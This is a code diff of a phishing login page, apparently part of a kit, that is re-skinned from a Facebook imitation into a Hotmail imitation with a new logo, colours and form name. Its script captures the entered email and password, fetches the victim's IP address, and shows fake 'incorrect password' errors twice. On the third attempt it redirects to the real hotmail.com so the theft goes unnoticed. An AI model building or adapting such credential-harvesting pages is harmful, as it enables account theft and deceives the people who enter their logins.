@@ -5,14 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hotmail</title>
     <style>
-        /* CSS Styling */
+        /* Hotmail Themed Styling */
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f0f2f5;
+            background-color: #f4f7fa;
             margin: 0;
         }
 
@@ -26,7 +26,7 @@
         }
 
         .logo {
-            width: 200px;
+            width: 150px;
             margin-bottom: 20px;
         }
 
@@ -43,7 +43,7 @@
         button {
             width: 100%;
             padding: 12px;
-            background-color: #1877f2;
+            background-color: #0078d4;  /* Hotmail Blue */
             border: none;
             border-radius: 5px;
             color: white;
@@ -52,7 +52,7 @@
         }
 
         button:hover {
-            background-color: #0d65d9;
+            background-color: #005a8c;  /* Darker Blue */
         }
 
         #errorMessage {
@@ -63,8 +63,8 @@
 </head>
 <body>
     <div class="login-box">
-        <!-- Facebook Logo -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="logo">
+        <!-- Hotmail Logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Hotmail_logo_2012.svg" alt="Hotmail Logo" class="logo">
         
         <!-- Login Form -->
         <form id="loginForm">
@@ -87,7 +87,7 @@
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const formName = "Facebook";
+            const formName = "Hotmail";
             
             // Fetching user's IP address
             const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -119,8 +119,7 @@
             if (attemptCount < 3) {
                 document.getElementById('errorMessage').textContent = "Incorrect password. Try again.";
             } else {
-                alert('Redirecting to another page after 3rd failed attempt.');
-                window.location.href = "https://www.google.com"; // Change redirect URL here
+                window.location.href = "https://www.hotmail.com";  // Redirect after 3rd attempt
             }
         });
     </script>
